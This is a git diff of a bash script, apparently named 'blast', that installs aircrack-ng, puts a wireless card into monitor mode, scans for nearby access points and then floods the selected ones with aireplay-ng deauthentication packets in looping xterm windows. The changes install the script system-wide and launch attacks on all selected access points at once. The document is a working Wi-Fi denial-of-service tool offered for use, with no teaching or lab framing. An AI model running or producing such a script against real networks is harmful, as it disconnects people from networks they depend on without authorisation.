@@ -1,10 +1,11 @@
 #!/bin/bash
-
+#by rff-glitch (raef)
 if [[ $EUID -ne 0 ]]; then 
     echo -e "\e[31m[!] Root access is required. Run this script as root.\e[0m"
     exit 1
 fi
 
+sudo cp ./blast.sh /usr/bin/blast
 sudo apt install -y aircrack-ng xterm
 
 for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
@@ -61,7 +62,6 @@ iw dev "$iface" set type monitor
 ip link set "$iface" up
 iw dev "$iface" set power_save off
 
-
 scan_file="scan_$(date +%s)"
 echo -e "\n${GREEN}📡 Scanning for targets - window will auto close in 10s...${RESET}"
 sleep 2
@@ -73,7 +73,6 @@ for i in {9..1}; do
     sleep 1
 done
 echo -e "\r${GREEN}✅ Scan complete.${RESET}"
-
 
 csv_file="${scan_file}-01.csv"
 if [[ ! -f "$csv_file" ]]; then 
@@ -134,7 +133,6 @@ trap cleanup INT
 echo -e "\n${CYAN}${BOLD}⚠️  WARNING: You are about to launch the attack!${RESET}"
 read -p "Press ENTER to begin the assault or CTRL+C to cancel..."
 
-
 echo -e "\n${RED}${BOLD}💣 Launching attack...${RESET}"
 attack_animation &
 attack_pid=$!
@@ -142,16 +140,16 @@ attack_pid=$!
 for ap in "${selected[@]}"; do
   IFS='|' read -r bssid channel essid <<< "$ap"
   iw dev "$iface" set channel "$channel"
-  for i in {1..5}; do
+  for i in {1..3}; do
     xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $essid" \
       -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
     sleep 0.2
   done
-  sleep 2
-  read -p "\nPress ENTER to stop attack and restore your network..."
-  kill $attack_pid
-  cleanup
-  break
-  done
-#by raef 
-#rff-glitch
+done
+
+read -p $'\nPress ENTER to stop all attacks and restore your network...'
+kill $attack_pid
+cleanup
+
+#by rff-glitch
+
